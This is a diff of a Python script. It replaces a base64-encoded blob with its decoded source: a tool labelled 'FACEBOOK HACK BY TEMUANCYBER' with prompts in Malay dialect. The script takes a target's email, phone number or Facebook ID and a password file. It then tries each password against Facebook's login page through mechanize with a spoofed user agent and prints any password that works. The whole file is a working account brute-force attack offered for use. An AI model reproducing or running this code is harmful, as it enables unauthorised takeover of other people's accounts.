@@ -1,104 +1,153 @@
 #Buat Apa Mencuri Lagi Bagus Buat Sendiri 🙂
 
-import base64
 
-encoded_string = "aW1wb3J0IHN5cwppbXBvcnQgcmFuZG9tCmltcG9ydCBtZWNoYW5pemUKZnJvbSBodHRwIGltcG9y
+import sys
+import random
+import mechanize
+from http import cookiejar
 
-dCBjb29raWVqYXIKCkdIVCA9ICcnJwogICAgICAgRkFDRUJPT0sgSEFDSyBCWSBURU1VQU5DWUJF
+GHT = '''
+       FACEBOOK HACK BY TEMUANCYBER
+       
+'''
+print("NOTE => Hai Mamak , Terimak Kasih Gunak !")
+print("Mamak Nak Hack Pesbuk Sapak ? ")
+print ("⇶TEMUANCYBER") 
+print ("Nak Keluar Tekan : ( ctrl + c ) ") 
 
-UgogICAgICAgCicnJwpwcmludCgiTk9URSA9PiBIYWkgTWFtYWsgLCBUZXJpbWFrIEthc2loIEd1
+email = input("# Masuk Email | Nombor Henpon | ID Pesbuk | Nama Pesbuk: ")
+passwordlist = input("Masukkan password dekat sinin : ")
 
-bmFrICEiKQpwcmludCgiTWFtYWsgTmFrIEhhY2sgUGVzYnVrIFNhcGFrID8gIikKcHJpbnQgKCLi
+useragents = ['Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1']
 
-h7ZURU1VQU5DWUJFUiIpIApwcmludCAoIk5hayBLZWx1YXIgVGVrYW4gOiAoIGN0cmwgKyBjICkg
+login = 'https://www.facebook.com/login.php?login_attempt=1'
 
-IikgCgplbWFpbCA9IGlucHV0KCIjIE1hc3VrIEVtYWlsIHwgTm9tYm9yIEhlbnBvbiB8IElEIFBl
+def attack(password):
+    try:
+        sys.stdout.write("\r[*] Tengah Terai nin %s.. " % password)
+        sys.stdout.flush()
+        br.addheaders = [('User-agent', random.choice(useragents))]
+        site = br.open(login)
+        br.select_form(nr=0)
+        br.form['email'] = email
+        br.form['pass'] = password
+        br.submit()
+        log = br.geturl()
+        if log == login:
+            print("\n\n\n[*] Oh! Dah Jumpak !!!")
+            print("[*] Paswed Diak: %s\n" % (password))
+             sys.exit(1)
+    except KeyboardInterrupt:
+        print("\n[*] OTW Keluar...")
+        sys.exit(1)
 
-c2J1ayB8IE5hbWEgUGVzYnVrOiAiKQpwYXNzd29yZGxpc3QgPSBpbnB1dCgiTWFzdWtrYW4gcGFz
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n", ""))
 
-c3dvcmQgZGVrYXQgc2luaW4gOiAiKQoKdXNlcmFnZW50cyA9IFsnTW96aWxsYS81LjAgKFgxMTsg
+def check():
+    global br
+    global passwords
+    try:
+        br = mechanize.Browser()
+        cj = cookiejar.LWPCookieJar()
+        br.set_handle_robots(False)
+        br.set_handle_equiv(True)
+        br.set_handle_referer(True)
+        br.set_handle_redirect(True)
+        br.set_cookiejar(cj)
+        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+        print("\n[*] OTW Keluarlah...\n")
+        sys.exit(1)
+    try:
+        password_file = open(passwordlist, "r")
+        passwords = password_file.readlines()
+        k = 0
+        while k < len(passwords):
+            passwords[k] = passwords[k].strip()
+            k += 1
+    except IOError:
+        print("\n[*] Salah tuk mamak ai ? : Gunak (paswed.txt).\n")
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print("\n[*] Gusak program...\n")
+        sys.exit(1)
+    try:
+        print(GHT.strip())
+        print(" [*] Akaun Uwang : %s" % (email))
+        print(" [*] Sabar duluk mamak !!! :", len(passwords), "passwords")
+        print(" [*] Minum Duluk Extra Jozz Duluk!")
+    except KeyboardInterrupt:
+        print("\n[*] OTW Keluar...\n")
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print("\n[*] OTW Keluar...\n")
+        sys.exit(1)
 
-VTsgTGludXggaTY4NjsgZW4tVVM7IHJ2OjEuOS4wLjEpIEdlY2tvLzIwMDgwNzE2MTUgRmVkb3Jh
+if __name__ == '__main__':
+    check()
 
-LzMuMC4xLTEuZmM5IEZpcmVmb3gvMy4wLjEnXQoKbG9naW4gPSAnaHR0cHM6Ly93d3cuZmFjZWJv
 
-b2suY29tL2xvZ2luLnBocD9sb2dpbl9hdHRlbXB0PTEnCgpkZWYgYXR0YWNrKHBhc3N3b3JkKToK
 
-ICAgIHRyeToKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJcclsqXSBUZW5nYWggVGVyYWkgbmlu
 
-ICVzLi4gIiAlIHBhc3N3b3JkKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGJy
 
-LmFkZGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgcmFuZG9tLmNob2ljZSh1c2VyYWdlbnRzKSld
 
-CiAgICAgICAgc2l0ZSA9IGJyLm9wZW4obG9naW4pCiAgICAgICAgYnIuc2VsZWN0X2Zvcm0obnI9
 
-MCkKICAgICAgICBici5mb3JtWydlbWFpbCddID0gZW1haWwKICAgICAgICBici5mb3JtWydwYXNz
 
-J10gPSBwYXNzd29yZAogICAgICAgIGJyLnN1Ym1pdCgpCiAgICAgICAgbG9nID0gYnIuZ2V0dXJs
 
-KCkKICAgICAgICBpZiBsb2cgPT0gbG9naW46CiAgICAgICAgICAgIHByaW50KCJcblxuXG5bKl0g
 
-T2ghIERhaCBKdW1wYWsgISEhIikKICAgICAgICAgICAgcHJpbnQoIlsqXSBQYXN3ZWQgRGlhazog
 
-JXNcbiIgJSAocGFzc3dvcmQpKQogICAgICAgICAgICAgc3lzLmV4aXQoMSkKICAgIGV4Y2VwdCBL
 
-ZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5bKl0gT1RXIEtlbHVhci4uLiIpCiAg
 
-ICAgICAgc3lzLmV4aXQoMSkKCmRlZiBzZWFyY2goKToKICAgIGdsb2JhbCBwYXNzd29yZAogICAg
 
-Zm9yIHBhc3N3b3JkIGluIHBhc3N3b3JkczoKICAgICAgICBhdHRhY2socGFzc3dvcmQucmVwbGFj
 
-ZSgiXG4iLCAiIikpCgpkZWYgY2hlY2soKToKICAgIGdsb2JhbCBicgogICAgZ2xvYmFsIHBhc3N3
 
-b3JkcwogICAgdHJ5OgogICAgICAgIGJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQogICAgICAgIGNq
 
-ID0gY29va2llamFyLkxXUENvb2tpZUphcigpCiAgICAgICAgYnIuc2V0X2hhbmRsZV9yb2JvdHMo
 
-RmFsc2UpCiAgICAgICAgYnIuc2V0X2hhbmRsZV9lcXVpdihUcnVlKQogICAgICAgIGJyLnNldF9o
 
-YW5kbGVfcmVmZXJlcihUcnVlKQogICAgICAgIGJyLnNldF9oYW5kbGVfcmVkaXJlY3QoVHJ1ZSkK
 
-ICAgICAgICBici5zZXRfY29va2llamFyKGNqKQogICAgICAgIGJyLnNldF9oYW5kbGVfcmVmcmVz
 
-aChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSwgbWF4X3RpbWU9MSkKICAg
 
-IGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5bKl0gT1RXIEtlbHVh
 
-cmxhaC4uLlxuIikKICAgICAgICBzeXMuZXhpdCgxKQogICAgdHJ5OgogICAgICAgIHBhc3N3b3Jk
 
-X2ZpbGUgPSBvcGVuKHBhc3N3b3JkbGlzdCwgInIiKQogICAgICAgIHBhc3N3b3JkcyA9IHBhc3N3
 
-b3JkX2ZpbGUucmVhZGxpbmVzKCkKICAgICAgICBrID0gMAogICAgICAgIHdoaWxlIGsgPCBsZW4o
 
-cGFzc3dvcmRzKToKICAgICAgICAgICAgcGFzc3dvcmRzW2tdID0gcGFzc3dvcmRzW2tdLnN0cmlw
 
-KCkKICAgICAgICAgICAgayArPSAxCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCgi
 
-XG5bKl0gU2FsYWggdHVrIG1hbWFrIGFpID8gOiBHdW5hayAocGFzd2VkLnR4dCkuXG4iKQogICAg
 
-ICAgIHN5cy5leGl0KDEpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJp
 
-bnQoIlxuWypdIEd1c2FrIHByb2dyYW0uLi5cbiIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIHRy
 
-eToKICAgICAgICBwcmludChHSFQuc3RyaXAoKSkKICAgICAgICBwcmludCgiIFsqXSBBa2F1biBV
 
-d2FuZyA6ICVzIiAlIChlbWFpbCkpCiAgICAgICAgcHJpbnQoIiBbKl0gU2FiYXIgZHVsdWsgbWFt
 
-YWsgISEhIDoiLCBsZW4ocGFzc3dvcmRzKSwgInBhc3N3b3JkcyIpCiAgICAgICAgcHJpbnQoIiBb
 
-Kl0gTWludW0gRHVsdWsgRXh0cmEgSm96eiBEdWx1ayEiKQogICAgZXhjZXB0IEtleWJvYXJkSW50
 
-ZXJydXB0OgogICAgICAgIHByaW50KCJcblsqXSBPVFcgS2VsdWFyLi4uXG4iKQogICAgICAgIHN5
 
-cy5leGl0KDEpCiAgICB0cnk6CiAgICAgICAgc2VhcmNoKCkKICAgICAgICBhdHRhY2socGFzc3dv
 
-cmQpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoIlxuWypdIE9U
 
-VyBLZWx1YXIuLi5cbiIpCiAgICAgICAgc3lzLmV4aXQoMSkKCmlmIF9fbmFtZV9fID09ICdfX21h
 
-aW5fXyc6CiAgICBjaGVjaygp"
 
-decoded_string = base64.b64decode(encoded_string).decode("utf-8")
 
-print(decoded_string)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
